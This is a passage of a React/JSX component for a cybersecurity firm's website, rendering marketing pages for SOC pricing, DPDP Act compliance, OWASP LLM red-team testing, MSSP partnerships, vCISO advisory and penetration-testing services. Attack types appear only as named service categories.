                      { tier: "Essential SOC", price: "₹2.5L/mo", color: "border-slate-700", badge: "text-slate-400 bg-slate-800", features: ["8×5 monitoring", "SIEM log management", "Alert triage (up to 500 alerts/day)", "Monthly compliance report", "Email support (SLA: 4h)"] },
                      { tier: "Professional SOC", price: "₹6L/mo", color: "border-violet-700", badge: "text-violet-400 bg-violet-950", features: ["24×7 monitoring", "AI triage + threat hunting", "Unlimited alert processing", "SOAR playbook automation", "Weekly reports + MITRE ATT&CK mapping", "Dedicated analyst (SLA: 1h)"] },
                      { tier: "Enterprise SOC", price: "Custom", color: "border-cyan-700", badge: "text-cyan-400 bg-cyan-950", features: ["24×7 dedicated SOC team", "Full SIEM/SOAR/EDR deployment", "On-prem + cloud + OT/ICS coverage", "vCISO inclusion", "Real-time executive dashboard", "15-minute MTTR SLA guarantee"] },
                    ].map(t => (
                      <div key={t.tier} className={`border ${t.color} rounded-xl p-5 space-y-3`}>
                        <div>
                          <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded ${t.badge}`}>{t.tier}</span>
                          <div className="text-xl font-extrabold text-white mt-2 font-mono">{t.price}</div>
                        </div>
                        <ul className="space-y-1.5">
                          {t.features.map(f => (
                            <li key={f} className="flex items-start gap-2 text-[11px] text-slate-400 font-sans">
                              <span className="text-emerald-400 shrink-0 mt-0.5">✓</span>{f}
                            </li>
                          ))}
                        </ul>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="bg-gradient-to-r from-violet-950/30 to-slate-900/60 border border-violet-800/30 rounded-xl p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-white mb-1">Ready to activate your SOC in 72 hours?</h3>
                    <p className="text-xs text-slate-400 font-sans">Our onboarding team deploys log collectors and integrations in under 3 business days. No hardware required.</p>
                  </div>
                  <button onClick={() => setShowContactModal(true)} className="shrink-0 px-6 py-2.5 bg-violet-500 hover:bg-violet-400 text-white text-xs font-extrabold rounded-lg uppercase tracking-wider transition-colors">
                    Start Free SOC Assessment
                  </button>
                </div>
              </div>
            )}

            {/* ===== DPDP ACT COMPLIANCE SCANS ===== */}
            {currentView === "dpdp" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-amber-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse" /> Enterprise Service · India Compliance
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-4 leading-tight">
                    India DPDP Act 2023 Compliance Scans
                  </h1>
                  <p className="text-slate-300 leading-relaxed text-sm md:text-base font-sans max-w-3xl">
                    The Digital Personal Data Protection Act 2023 (DPDP Act) is India's landmark data protection law — and non-compliance carries penalties up to ₹250 crore per violation. CyberDudeBivash® delivers end-to-end DPDP compliance scanning, data mapping, DPO advisory, and breach-readiness assessments to bring your organization into full conformance before regulators come knocking.
                  </p>
                </div>
                <div className="bg-amber-950/20 border border-amber-800/30 rounded-xl p-6">
                  <h2 className="text-sm font-bold text-amber-400 mb-3">Why DPDP Act Compliance Cannot Wait</h2>
                  <div className="grid md:grid-cols-3 gap-4 text-xs font-sans">
                    {[
                      { head: "₹250 Crore Penalty", body: "Maximum financial penalty per DPDP Act violation — applicable to Data Fiduciaries who fail to implement adequate safeguards." },
                      { head: "Significant Data Fiduciary", body: "Certain categories of businesses (by data volume or sensitivity) will be designated SDF with heightened obligations — are you ready?" },
                      { head: "72-Hour Breach Notification", body: "Mandatory notification to Data Protection Board and affected Data Principals within 72 hours of breach discovery." },
                    ].map(c => (
                      <div key={c.head} className="bg-amber-950/30 border border-amber-900/40 rounded-lg p-3">
                        <h4 className="font-bold text-amber-300 mb-1">{c.head}</h4>
                        <p className="text-slate-400 leading-relaxed">{c.body}</p>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Our DPDP Compliance Service Portfolio</h2>
                  <div className="grid md:grid-cols-2 gap-4">
                    {[
                      { title: "DPDP Gap Assessment", icon: "🔍", desc: "Comprehensive audit of your current data processing activities against all DPDP Act 2023 obligations — identifying gaps in consent management, data localisation, purpose limitation, and retention policies." },
                      { title: "Personal Data Inventory & Mapping", icon: "🗂️", desc: "Full data discovery and mapping across your IT estate — identifying where personal data of Indian citizens is collected, stored, processed, and transferred. Output: RoPA (Record of Processing Activities) document." },
                      { title: "Consent Framework Implementation", icon: "✅", desc: "Design and technical implementation of a DPDP-compliant consent management platform — covering notice requirements, granular consent, withdrawal mechanisms, and consent audit trails." },
                      { title: "Data Localisation Architecture Review", icon: "🏛️", desc: "Technical review of your data storage architecture to ensure personal data of Indian residents is stored within India, with compliant cross-border transfer mechanisms for approved jurisdictions." },
                      { title: "DPO Advisory & Training", icon: "👤", desc: "Virtual Data Protection Officer (DPO) service — advising on day-to-day DPDP compliance, employee training, privacy-by-design reviews, and board-level data governance reporting." },
                      { title: "Breach Notification Readiness", icon: "🚨", desc: "Develop and test your Personal Data Breach Response Plan — including 72-hour notification workflows, communication templates, Data Protection Board reporting procedures, and post-breach remediation." },
                      { title: "Privacy Impact Assessment (PIA)", icon: "📝", desc: "Structured PIA methodology for new products, features, and data processing activities — identifying privacy risks before they become compliance violations." },
                      { title: "Third-Party Data Processor Audits", icon: "🔗", desc: "Audit of vendor and data processor agreements (DPAs) to ensure your entire supply chain meets DPDP Act obligations. Non-compliant processors are a direct liability for Data Fiduciaries." },
                    ].map(c => (
                      <div key={c.title} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4 flex gap-3">
                        <span className="text-lg shrink-0">{c.icon}</span>
                        <div>
                          <h4 className="text-xs font-bold text-slate-200 mb-1">{c.title}</h4>
                          <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{c.desc}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">DPDP Act Key Obligations We Cover</h2>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    {[
                      ["Section 4", "Grounds for processing personal data (consent + legitimate use)"],
                      ["Section 5", "Notice requirements before collecting personal data"],
                      ["Section 6", "Consent management obligations"],
                      ["Section 7", "Certain legitimate uses without consent"],
                      ["Section 8", "General obligations of Data Fiduciaries"],
                      ["Section 9", "Processing children's personal data"],
                      ["Section 10", "Significant Data Fiduciary obligations"],
                      ["Section 11", "Rights of Data Principals (access, correction, erasure)"],
                      ["Section 12", "Right to nominate data successor"],
                      ["Section 13-14", "Duties and remedies for Data Principals"],
                      ["Section 16", "Transfer of personal data outside India"],
                      ["Section 17-18", "Data Protection Board establishment"],
                      ["Section 19", "Breach notification to Board and individuals"],
                      ["Section 33", "Penalties — up to ₹250 crore per violation"],
                    ].map(([sec, desc]) => (
                      <div key={sec} className="flex gap-3 text-[11px] font-sans bg-slate-900/30 border border-slate-800/60 rounded px-3 py-2">
                        <span className="font-mono text-amber-400 shrink-0 font-bold">{sec}</span>
                        <span className="text-slate-400">{desc}</span>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="bg-gradient-to-r from-amber-950/30 to-slate-900/60 border border-amber-800/30 rounded-xl p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-white mb-1">Get your DPDP readiness score in 48 hours</h3>
                    <p className="text-xs text-slate-400 font-sans">We'll run a preliminary DPDP gap assessment and deliver a readiness scorecard with prioritized remediation steps.</p>
                  </div>
                  <button onClick={() => setShowContactModal(true)} className="shrink-0 px-6 py-2.5 bg-amber-500 hover:bg-amber-400 text-black text-xs font-extrabold rounded-lg uppercase tracking-wider transition-colors">
                    Request DPDP Assessment
                  </button>
                </div>
              </div>
            )}

            {/* ===== OWASP LLM RED TEAM ===== */}
            {currentView === "owasp" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-red-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" /> Enterprise Service · AI Security
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-4 leading-tight">
                    OWASP LLM Red Team Testing
                  </h1>
                  <p className="text-slate-300 leading-relaxed text-sm md:text-base font-sans max-w-3xl">
                    As enterprises rush to deploy AI and Large Language Models, attackers have developed a new class of attacks specifically targeting AI systems. CyberDudeBivash® is India's leading AI Red Team, specializing in adversarial testing of LLM-powered applications against the full OWASP LLM Top 10 2024 threat catalogue — identifying vulnerabilities before your AI becomes a liability.
                  </p>
                </div>
                <div className="bg-red-950/20 border border-red-800/30 rounded-xl p-6">
                  <h2 className="text-sm font-bold text-red-400 mb-4">OWASP LLM Top 10 2024 — Our Testing Coverage</h2>
                  <div className="grid md:grid-cols-2 gap-3">
                    {[
                      { id: "LLM01", name: "Prompt Injection", desc: "Direct and indirect prompt injection attacks that override system instructions, exfiltrate data, or manipulate AI behavior." },
                      { id: "LLM02", name: "Insecure Output Handling", desc: "XSS, SSRF, RCE, and SQLi via unvalidated LLM outputs passed to downstream systems and parsers." },
                      { id: "LLM03", name: "Training Data Poisoning", desc: "Manipulation of training data to create backdoors, bias outputs, or embed adversarial triggers in fine-tuned models." },
                      { id: "LLM04", name: "Model Denial of Service", desc: "Resource exhaustion attacks via prompt flooding, context window abuse, and recursive token amplification." },
                      { id: "LLM05", name: "Supply Chain Vulnerabilities", desc: "Compromised base models, poisoned LoRA adapters, malicious plugins in the LLM development and deployment pipeline." },
                      { id: "LLM06", name: "Sensitive Information Disclosure", desc: "Extraction of training data, system prompts, API keys, PII, and proprietary business logic from LLM memory." },
                      { id: "LLM07", name: "Insecure Plugin Design", desc: "Privilege escalation and data exfiltration via poorly sandboxed LLM plugins, tool calls, and function execution." },
                      { id: "LLM08", name: "Excessive Agency", desc: "LLM autonomy exploits where manipulated agents take unauthorized actions beyond their intended permissions." },
                      { id: "LLM09", name: "Overreliance", desc: "Business risk assessment of over-dependence on LLM outputs in security-critical decision workflows without human review." },
                      { id: "LLM10", name: "Model Theft", desc: "Model extraction attacks, intellectual property theft via API probing, and reconstruction of proprietary model weights." },
                    ].map(v => (
                      <div key={v.id} className="flex gap-3 bg-slate-900/40 border border-slate-800 rounded-lg p-3">
                        <span className="text-[10px] font-mono text-red-400 bg-red-950/50 border border-red-900/40 px-1.5 py-0.5 rounded h-fit shrink-0 font-bold">{v.id}</span>
                        <div>
                          <h4 className="text-xs font-bold text-slate-200 mb-0.5">{v.name}</h4>
                          <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{v.desc}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">AI Red Team Methodology</h2>
                  <div className="space-y-3">
                    {[
                      { phase: "Phase 1: AI Asset Discovery", weeks: "Week 1", desc: "Map all AI/LLM components in your environment — base models, fine-tuned versions, RAG pipelines, agent frameworks (LangChain, AutoGen, CrewAI), API integrations, and plugin ecosystems." },
                      { phase: "Phase 2: Threat Modelling", weeks: "Week 1-2", desc: "STRIDE/DREAD threat modelling specific to your AI architecture. Identify attack surfaces: API endpoints, user input channels, tool execution paths, memory systems, and training data pipelines." },
                      { phase: "Phase 3: Automated Adversarial Testing", weeks: "Week 2-3", desc: "Deploy our proprietary AI attack suite — running 10,000+ automated prompt injection variants, jailbreak attempts, data extraction probes, and plugin abuse scenarios against your LLM deployment." },
                      { phase: "Phase 4: Manual Expert Red Teaming", weeks: "Week 3-4", desc: "Our AI security researchers conduct manual adversarial testing — chaining vulnerabilities, simulating sophisticated APT-level attacks, and testing edge cases not captured by automated tools." },
                      { phase: "Phase 5: Report & Remediation", weeks: "Week 4", desc: "Deliver executive summary + technical report with CVSSv4-scored findings, proof-of-concept exploit demonstrations, and a prioritized remediation roadmap aligned to your AI deployment timeline." },
                    ].map(p => (
                      <div key={p.phase} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4 flex gap-4">
                        <div className="shrink-0 text-right">
                          <div className="text-[9px] font-mono text-red-400 font-bold">{p.weeks}</div>
                        </div>
                        <div>
                          <h4 className="text-xs font-bold text-slate-200 mb-1">{p.phase}</h4>
                          <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{p.desc}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Deliverables</h2>
                  <div className="grid md:grid-cols-3 gap-3">
                    {["Executive Risk Summary (board-ready)", "Full OWASP LLM Top 10 test report", "CVSSv4-scored vulnerability findings", "PoC exploit demonstrations (controlled)", "Remediation roadmap (prioritized)", "Re-test validation included", "AI Security Policy templates", "Developer secure AI coding guidelines", "MITRE ATLAS technique mapping"].map(d => (
                      <div key={d} className="flex items-start gap-2 bg-slate-900/30 border border-slate-800 rounded-lg px-3 py-2 text-[11px] text-slate-400 font-sans">
                        <span className="text-emerald-400 shrink-0">✓</span>{d}
                      </div>
                    ))}
                  </div>
                </div>
                <div className="bg-gradient-to-r from-red-950/30 to-slate-900/60 border border-red-800/30 rounded-xl p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-white mb-1">Is your AI application adversarially hardened?</h3>
                    <p className="text-xs text-slate-400 font-sans">Book a free 30-minute AI security scoping call with our red team lead.</p>
                  </div>
                  <button onClick={() => setShowContactModal(true)} className="shrink-0 px-6 py-2.5 bg-red-500 hover:bg-red-400 text-white text-xs font-extrabold rounded-lg uppercase tracking-wider transition-colors">
                    Schedule AI Red Team
                  </button>
                </div>
              </div>
            )}

            {/* ===== MULTI-TENANT MSSP SUITE ===== */}
            {currentView === "mssp" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-sky-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-sky-400 animate-pulse" /> Enterprise Service · MSSP Platform
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-4 leading-tight">
                    Multi-Tenant MSSP Suite
                  </h1>
                  <p className="text-slate-300 leading-relaxed text-sm md:text-base font-sans max-w-3xl">
                    Launch or scale your Managed Security Service Provider (MSSP) business on CyberDudeBivash®'s battle-tested multi-tenant infrastructure. Our MSSP Suite gives you white-labeled threat intelligence, SOC tooling, client management portals, and billing automation — everything you need to deliver enterprise security services to dozens of clients from a single pane of glass.
                  </p>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {[
                    { v: "500+", l: "Active MSSP Tenants", c: "text-sky-400" },
                    { v: "99.99%", l: "Platform Uptime", c: "text-emerald-400" },
                    { v: "50+", l: "Countries Supported", c: "text-violet-400" },
                    { v: "72hr", l: "Onboarding SLA", c: "text-amber-400" },
                  ].map(s => (
                    <div key={s.l} className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 text-center">
                      <div className={`text-2xl font-extrabold font-mono ${s.c}`}>{s.v}</div>
                      <div className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">{s.l}</div>
                    </div>
                  ))}
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Platform Capabilities</h2>
                  <div className="grid md:grid-cols-2 gap-4">
                    {[
                      { title: "True Multi-Tenancy", icon: "🏢", desc: "Fully isolated tenant environments with dedicated data stores, separate RBAC policies, and zero data bleed between client environments. Each client sees only their data." },
                      { title: "White-Label Branding", icon: "🎨", desc: "Deploy the entire CYBERDUDEBIVASH platform under your own brand — custom domain, your logo, your color scheme, your product names. Clients never see the CyberDudeBivash name." },
                      { title: "Unified Client Management Portal", icon: "🖥️", desc: "Single-pane-of-glass dashboard for managing all client tenants. Monitor health, alerts, SLA compliance, and escalations across your entire client portfolio simultaneously." },
                      { title: "Threat Intelligence Resale", icon: "🌐", desc: "White-labeled Sentinel APEX™ threat feeds delivered under your brand. Resell real-time IOC feeds, CVE intelligence, and SIGMA rules as part of your managed security offering." },
                      { title: "Automated Billing & Reporting", icon: "💰", desc: "Client-specific usage metering, automated invoice generation, white-labeled monthly security reports, and SLA scorecards — all generated automatically for each client." },
                      { title: "API-First Integration", icon: "🔌", desc: "Full REST API for integrating MSSP Suite with your existing PSA tools (ConnectWise, Autotask), RMM platforms, ticketing systems (Jira, ServiceNow), and billing systems." },
                    ].map(c => (
                      <div key={c.title} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4 flex gap-3">
                        <span className="text-lg shrink-0">{c.icon}</span>
                        <div>
                          <h4 className="text-xs font-bold text-slate-200 mb-1">{c.title}</h4>
                          <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{c.desc}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">MSSP Partner Tiers</h2>
                  <div className="grid md:grid-cols-3 gap-4">
                    {[
                      { tier: "MSSP Starter", price: "₹50K/mo", clients: "Up to 10 clients", color: "border-slate-700", badge: "text-slate-400 bg-slate-800", features: ["10 client tenants", "White-label threat feeds", "Basic client portal", "Email support", "Standard reporting"] },
                      { tier: "MSSP Professional", price: "₹1.5L/mo", clients: "Up to 50 clients", color: "border-sky-700", badge: "text-sky-400 bg-sky-950", features: ["50 client tenants", "Full white-label suite", "SOC tooling included", "Dedicated partner manager", "Custom reporting", "PSA/RMM integrations"] },
                      { tier: "MSSP Enterprise", price: "Custom", clients: "Unlimited clients", color: "border-cyan-700", badge: "text-cyan-400 bg-cyan-950", features: ["Unlimited tenants", "On-prem deployment option", "Revenue share model", "Co-marketing program", "Priority engineering support", "SLA: 99.99% uptime"] },
                    ].map(t => (
                      <div key={t.tier} className={`border ${t.color} rounded-xl p-5 space-y-3`}>
                        <div>
                          <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded ${t.badge}`}>{t.tier}</span>
                          <div className="text-xl font-extrabold text-white mt-2 font-mono">{t.price}</div>
                          <div className="text-[10px] text-slate-500 mt-0.5">{t.clients}</div>
                        </div>
                        <ul className="space-y-1.5">
                          {t.features.map(f => (
                            <li key={f} className="flex items-start gap-2 text-[11px] text-slate-400 font-sans">
                              <span className="text-emerald-400 shrink-0 mt-0.5">✓</span>{f}
                            </li>
                          ))}
                        </ul>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="bg-gradient-to-r from-sky-950/30 to-slate-900/60 border border-sky-800/30 rounded-xl p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-white mb-1">Ready to launch your MSSP practice?</h3>
                    <p className="text-xs text-slate-400 font-sans">Get a personalized MSSP business case with projected revenue models for your target client base.</p>
                  </div>
                  <button onClick={() => setShowContactModal(true)} className="shrink-0 px-6 py-2.5 bg-sky-500 hover:bg-sky-400 text-white text-xs font-extrabold rounded-lg uppercase tracking-wider transition-colors">
                    Apply for MSSP Partnership
                  </button>
                </div>
              </div>
            )}

            {/* ===== vCISO ADVISORY ===== */}
            {currentView === "vciso" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-emerald-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> Enterprise Service · Executive Advisory
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-4 leading-tight">
                    Virtual CISO (vCISO) Advisory
                  </h1>
                  <p className="text-slate-300 leading-relaxed text-sm md:text-base font-sans max-w-3xl">
                    A full-time Chief Information Security Officer costs ₹1–2 crore annually in India. Our Virtual CISO service gives you the strategic security leadership of a seasoned CISO — available on-demand, aligned to your business objectives, and integrated with your executive team — at a fraction of the cost. Built for SMEs, startups, and mid-market enterprises that need enterprise-grade security governance without a full-time hire.
                  </p>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {[
                    { v: "₹15L/yr", l: "vs ₹1.5Cr full-time CISO", c: "text-emerald-400" },
                    { v: "48hr", l: "Incident Response SLA", c: "text-cyan-400" },
                    { v: "100+", l: "Security Frameworks", c: "text-violet-400" },
                    { v: "15yr+", l: "Avg. vCISO Experience", c: "text-amber-400" },
                  ].map(s => (
                    <div key={s.l} className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 text-center">
                      <div className={`text-xl font-extrabold font-mono ${s.c}`}>{s.v}</div>
                      <div className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">{s.l}</div>
                    </div>
                  ))}
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">What Your vCISO Does</h2>
                  <div className="grid md:grid-cols-2 gap-4">
                    {[
                      { title: "Security Strategy & Roadmap", icon: "🗺️", desc: "Develop a 3-year cybersecurity strategy aligned to your business goals, risk appetite, regulatory requirements, and budget. Deliver quarterly roadmap updates to your board." },
                      { title: "Risk Assessment & Management", icon: "⚖️", desc: "Conduct ISO 27005/NIST-aligned risk assessments. Maintain your risk register, track treatment status, and ensure residual risk is within board-approved tolerance levels." },
                      { title: "Policy & Framework Development", icon: "📋", desc: "Draft, review, and maintain your complete security policy library — information security policy, BYOD, acceptable use, incident response, vendor management, BCP/DR policies." },
                      { title: "Regulatory Compliance Oversight", icon: "🏛️", desc: "Primary contact for auditors, regulators, and certification bodies. Manage ISO 27001, SOC 2, PCI-DSS, DPDP Act, and RBI cybersecurity framework compliance programs." },
                      { title: "Board & Executive Reporting", icon: "📊", desc: "Monthly security posture reports for the board. Translate technical risk into business language — board members understand business impact, not CVE scores." },
                      { title: "Security Awareness Program", icon: "🎓", desc: "Design and manage company-wide security awareness training, phishing simulation campaigns, and security culture transformation initiatives." },
                      { title: "Vendor Risk Management", icon: "🔗", desc: "Third-party risk assessments for critical vendors and cloud providers. Negotiate security requirements into contracts and ensure ongoing vendor compliance monitoring." },
                      { title: "Incident Response Leadership", icon: "🚨", desc: "Command your incident response during active breaches — coordinating technical teams, communicating with executives, managing regulatory notifications, and leading post-incident reviews." },
                    ].map(c => (
                      <div key={c.title} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4 flex gap-3">
                        <span className="text-lg shrink-0">{c.icon}</span>
                        <div>
                          <h4 className="text-xs font-bold text-slate-200 mb-1">{c.title}</h4>
                          <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{c.desc}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">vCISO Engagement Models</h2>
                  <div className="grid md:grid-cols-3 gap-4">
                    {[
                      { tier: "Advisory Retainer", price: "₹75K/mo", hours: "8 hrs/month", color: "border-slate-700", badge: "text-slate-400 bg-slate-800", features: ["Monthly strategy call", "Board report template", "Policy review (2/quarter)", "Incident escalation support", "Email advisory access"] },
                      { tier: "Embedded vCISO", price: "₹1.5L/mo", hours: "20 hrs/month", color: "border-emerald-700", badge: "text-emerald-400 bg-emerald-950", features: ["Bi-weekly leadership calls", "Full policy development", "Compliance program management", "Risk register management", "Vendor risk assessments", "Board presentations included"] },
                      { tier: "Full vCISO", price: "₹3L/mo", hours: "40+ hrs/month", color: "border-cyan-700", badge: "text-cyan-400 bg-cyan-950", features: ["Weekly executive alignment", "ISO 27001 / SOC 2 program", "24hr incident response SLA", "Full security roadmap ownership", "Regulatory interface", "Annual security strategy offsite"] },
                    ].map(t => (
                      <div key={t.tier} className={`border ${t.color} rounded-xl p-5 space-y-3`}>
                        <div>
                          <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded ${t.badge}`}>{t.tier}</span>
                          <div className="text-xl font-extrabold text-white mt-2 font-mono">{t.price}</div>
                          <div className="text-[10px] text-slate-500 mt-0.5">{t.hours}</div>
                        </div>
                        <ul className="space-y-1.5">
                          {t.features.map(f => (
                            <li key={f} className="flex items-start gap-2 text-[11px] text-slate-400 font-sans">
                              <span className="text-emerald-400 shrink-0 mt-0.5">✓</span>{f}
                            </li>
                          ))}
                        </ul>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="bg-gradient-to-r from-emerald-950/30 to-slate-900/60 border border-emerald-800/30 rounded-xl p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-white mb-1">Get your first vCISO session free</h3>
                    <p className="text-xs text-slate-400 font-sans">60-minute complimentary security strategy session with a senior CyberDudeBivash security executive.</p>
                  </div>
                  <button onClick={() => setShowContactModal(true)} className="shrink-0 px-6 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-extrabold rounded-lg uppercase tracking-wider transition-colors">
                    Book Free vCISO Session
                  </button>
                </div>
              </div>
            )}

            {/* ===== PENETRATION TESTING ===== */}
            {currentView === "pentest" && (
              <div className="space-y-10">
                <div>
                  <div className="text-[10px] font-mono text-pink-400 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-pink-400 animate-pulse" /> Enterprise Service · Offensive Security
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-4 leading-tight">
                    Professional Penetration Testing
                  </h1>
                  <p className="text-slate-300 leading-relaxed text-sm md:text-base font-sans max-w-3xl">
                    CyberDudeBivash® delivers full-spectrum penetration testing engagements — from web application and API security to network infrastructure, cloud environments, mobile applications, and social engineering. Our certified red team follows rigorous methodologies (OWASP, PTES, NIST 800-115) and delivers actionable, risk-scored reports that your developers can implement — not just a PDF of CVE numbers.
                  </p>
                </div>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {[
                    { v: "2,500+", l: "Engagements Completed", c: "text-pink-400" },
                    { v: "97%", l: "Critical Findings Rate", c: "text-red-400" },
                    { v: "5 days", l: "Avg. Delivery Time", c: "text-cyan-400" },
                    { v: "CERT-In", l: "Empanelled Organization", c: "text-emerald-400" },
                  ].map(s => (
                    <div key={s.l} className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 text-center">
                      <div className={`text-2xl font-extrabold font-mono ${s.c}`}>{s.v}</div>
                      <div className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">{s.l}</div>
                    </div>
                  ))}
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Penetration Testing Services</h2>
                  <div className="grid md:grid-cols-2 gap-4">
                    {[
                      { title: "Web Application Penetration Testing", icon: "🌐", tags: ["OWASP Top 10", "API Security", "Authentication Bypass", "Business Logic Flaws"], desc: "Manual + automated testing of web applications covering authentication, authorization, injection flaws, IDOR, SSRF, XXE, deserialization, and business logic vulnerabilities. Includes OWASP WSTG compliance coverage." },
                      { title: "API Security Testing", icon: "🔌", tags: ["REST", "GraphQL", "gRPC", "OAuth2"], desc: "Comprehensive API penetration testing — BOLA/BFLA, mass assignment, rate limiting bypasses, authentication flaws, improper asset management, and excessive data exposure per OWASP API Security Top 10." },
                      { title: "Network Infrastructure Pentest", icon: "🔌", tags: ["Internal", "External", "Segmentation", "Firewall"], desc: "External perimeter assessment, internal network penetration (post-breach simulation), network segmentation testing, firewall rule analysis, and lateral movement simulation across VLANs and DMZ segments." },
                      { title: "Cloud Security Assessment", icon: "☁️", tags: ["AWS", "Azure", "GCP", "Multi-Cloud"], desc: "Cloud configuration review, IAM privilege escalation, S3/Blob misconfiguration hunting, serverless function exploitation, container escape testing, and Kubernetes cluster penetration testing." },
                      { title: "Mobile Application Testing", icon: "📱", tags: ["Android", "iOS", "React Native", "Flutter"], desc: "Static and dynamic analysis of Android and iOS applications — insecure data storage, weak cryptography, certificate pinning bypass, deeplink exploitation, and backend API security assessment." },
                      { title: "Social Engineering Assessment", icon: "🎭", tags: ["Phishing", "Vishing", "Pretexting", "Physical"], desc: "Realistic social engineering campaigns — spear phishing simulations, vishing attacks, pretexting scenarios, and (if authorized) physical security testing of office premises and data center facilities." },
                      { title: "Red Team Operations", icon: "🔴", tags: ["APT Simulation", "C2 Framework", "Persistence", "Exfiltration"], desc: "Full adversary simulation engagements — emulating specific threat actor TTPs (MITRE ATT&CK mapped), establishing persistent access, moving laterally, exfiltrating data, and testing detection + response capabilities." },
                      { title: "Source Code Security Review", icon: "💻", tags: ["SAST", "Manual Review", "Secrets Scanning", "Dependency Audit"], desc: "Manual and automated source code security review — OWASP ASVS compliance, secret detection, dependency vulnerability analysis, and architectural security review of critical application logic." },
                    ].map(c => (
                      <div key={c.title} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4">
                        <div className="flex items-start gap-3 mb-2">
                          <span className="text-lg shrink-0">{c.icon}</span>
                          <h4 className="text-xs font-bold text-slate-200">{c.title}</h4>
                        </div>
                        <div className="flex flex-wrap gap-1 mb-2">
                          {c.tags.map(t => (
                            <span key={t} className="text-[9px] font-mono text-pink-400 bg-pink-950/40 border border-pink-900/40 px-1.5 py-0.5 rounded">{t}</span>
                          ))}
                        </div>
                        <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{c.desc}</p>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">Methodology & Certifications</h2>
                  <div className="grid md:grid-cols-2 gap-6">
                    <div className="space-y-3">
                      <h3 className="text-xs font-bold text-slate-300">Testing Methodologies</h3>
